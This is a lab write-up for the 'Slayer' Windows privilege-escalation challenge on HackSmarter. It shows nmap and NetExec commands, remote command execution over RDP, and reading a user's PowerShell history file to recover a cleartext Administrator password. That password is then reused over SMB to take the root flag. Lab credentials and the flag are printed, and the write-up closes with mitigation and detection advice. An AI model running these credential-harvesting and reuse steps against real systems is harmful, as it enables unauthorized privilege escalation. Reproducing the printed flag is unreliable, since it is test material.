Slayer: PowerShell history password → Administrator

Authorized lab write-up. Author of lab: Ryan Yager. Solved 2026-08-06.

Challenge / BoxSlayer
PlatformHackSmarter (DEFCON free access)
CategoryWindows privilege escalation / credential residue
VulnerabilityCleartext admin password in PSReadLine history
DifficultyEasy
Target (lab)10.1.176.119 · host EC2AMAZ-M1LFCNO
OutcomeFull compromise · root flag on Administrator Desktop

Pre-req knowledge

  • Windows local accounts vs domain; NTLM auth over SMB and RDP
  • How NetExec (nxc) proves credentials and runs remote commands
  • Where PowerShell stores interactive history (PSReadLine)
  • Why history and transcripts are high-value on multi-user or “handed” workstations

Core concept (one line)

If a low-priv user can read their own PowerShell history, any net user Administrator … command they (or malware) typed becomes a ready-made privilege escalation.

Introduction

After social engineering, the engagement hands you workstation credentials for tyler.ramsey. The host is a standalone Windows machine on an EC2-style build. Remote management is thin: SMB and RDP work; WinRM is filtered. The win is not a fancy potato exploit. It is credential archaeology on the interactive shell history.

Root cause

Someone ran net user administrator "<password>" in a PowerShell session that belonged to (or wrote into) tyler’s history file. Windows stored that line in cleartext under PSReadLine. The password still authenticated as the local Administrator. Cryptography was never broken — operator hygiene was. 

Client (Kali)
   │  tyler.ramsey:P@ssw0rd!
   ▼
SMB 445 / RDP 3389  ──►  tyler (low priv)
   │
   │  read ConsoleHost_history.txt
   ▼
Administrator password recovered
   │
   ▼
C$\Users\Administrator\Desktop\root.txt

Step 1: Reach the host and map services

Why we do this: Confirm VPN routing and which remote protocols you can use before you burn time on dead WinRM.
ping -c 1 10.1.176.119
nmap -Pn -n --top-ports 100 -T4 10.1.176.119

First principles

  • ping — ICMP reachability through the lab VPN (not a security control).
  • nmap -Pn — treat host as up; scan without host discovery.
  • Open here: 135 RPC, 445 SMB, 3389 RDP. WinRM 5985/5986 filtered.

What you should see: Host up; those three ports open.

Step 2: Prove the handed credentials

Why we do this: SE “works” only if the password is still valid on SMB and/or RDP. NetExec tells you that in one line.
nxc smb 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth
nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth

First principles

  • --local-auth — authenticate to the machine account SAM, not a domain controller.
  • SMB [+] — NTLM accepted; not necessarily local admin.
  • RDP (Pwn3d!) — credentials allow interactive logon (RDP Users).

What you should see: Host name EC2AMAZ-M1LFCNO, auth success, shares without C$/ADMIN$ write for tyler.

Step 3: Take a foothold and identity snapshot

Why we do this: Know groups and privileges before you pick a PE class. No SeImpersonate means potato-style tokens are not the first bet.
printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'whoami /all'

First principles

  • nxc rdp -x — log on over RDP, run a command, return output via clipboard automation.
  • whoami /all — SID, groups, privileges for the token you actually hold.

What you should see: Groups include Remote Desktop Users, Users, Performance Log Users. Privileges only SeChangeNotifyPrivilege and SeIncreaseWorkingSetPrivilege. Medium integrity.

Step 4: Enumerate user homes (signal for lateral local accounts)

Why we do this: Other profiles on disk mean other secrets, tasks, or mis-ACLs. Here we learn alice.wonderland and Administrator exist.
printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'dir C:\Users'

What you should see: Administrator, alice.wonderland, Public, tyler.ramsey.

Step 5: Read PowerShell history (winning move)

Why we do this: Interactive shells leave durable residue. On Windows 10/11, PSReadLine history is a plain-text file under the user’s roaming profile.
printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth \
  -x 'type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'

First principles

  • ConsoleHost_history.txt — default PSReadLine log of commands typed in powershell.exe.
  • type — print file contents; works when you have read ACL on your own profile.
  • History is not encrypted. It is a forensic gift and an attacker gift.

What you should see: a line equivalent to:

net user administrator "ebz0yxy3txh9BDE*yeh"

That is a local password set for Administrator, recorded forever in the user history.

Step 6: Authenticate as Administrator

Why we do this: Reuse the recovered password. If it still works, you own the box without kernel exploits.
nxc smb 10.1.176.119 -u Administrator -p 'ebz0yxy3txh9BDE*yeh' --local-auth
# expect: (Pwn3d!)

First principles

  • Local Administrator with a known password can open C$ and run high-priv remote methods.
  • (Pwn3d!) in NetExec SMB usually means admin-level access was detected.

Step 7: Read the root flag

Why we do this: Lab objective — flag in the administrator directory.
smbclient //10.1.176.119/C$ -U 'Administrator%ebz0yxy3txh9BDE*yeh' \
  -c 'get Users\Administrator\Desktop\root.txt root.txt'
cat root.txt

First principles

  • C$ — hidden administrative share of the system volume; requires admin rights.
  • smbclient get — pull a file over SMB without interactive desktop.
3835538c50e819f392144ae9ef125496

Security impact

  • Full local privilege escalation from a single handed user account
  • Cleartext recovery of the most privileged local account
  • Silent path — no exploit reliability issues, only file read + auth

Mitigation

  • Never set Administrator passwords from a low-priv interactive session.
  • Clear or disable PSReadLine history on shared / training / VDI images; use constrained language where possible.
  • Prefer LAPS (or equivalent) for local admin secrets; randomize after each use.
  • Detect Event ID 4724 / password-change activity and unusual readers of ConsoleHost_history.txt.
  • Segment RDP; require MFA on production bastions.

Beyond Root

Path under the microscope

The path works because three conditions line up: (1) you can log on as the user who owns the history file, (2) the history still contains a high-value secret, (3) the secret was not rotated after it was typed. Fail any one condition and the chain dies.

First principles drill

  • Trust boundary: “My history is private to me” — true for other users, false against yourself and anyone who steals your session.
  • Transform: interactive typing → append to PSReadLine file → durable disk secret.
  • Sink: net user / SAM accepts the password later via NTLM.
  • Canary: read history for net user, ConvertTo-SecureString, -AsPlainText, password.

Blue team — stop the vuln

  • Group Policy: disable history / set max history 0 on jump hosts.
  • Block interactive admin password management; use privileged access workstations.
  • EDR: alert on non-admin processes reading other users’ history (and on admin password set from user context).

If the CTF shortcut dies

  1. History wiped → hunt transcripts, .ps1 in Documents, browser password stores, DPAPI.
  2. No RDP → need WinRM, SSH, or physical/console; expand port map.
  3. Password rotated → classic PE (services, tasks, AlwaysInstallElevated, mis-ACLs on SysMgmtAgent-style custom services).

Conclusion

Slayer rewards thorough post-foothold hygiene checks. The “exploit” is reading a file you already own and reusing a password that should never have lived in a user shell log. That pattern transfers to every real engagement where operators type secrets into interactive consoles.
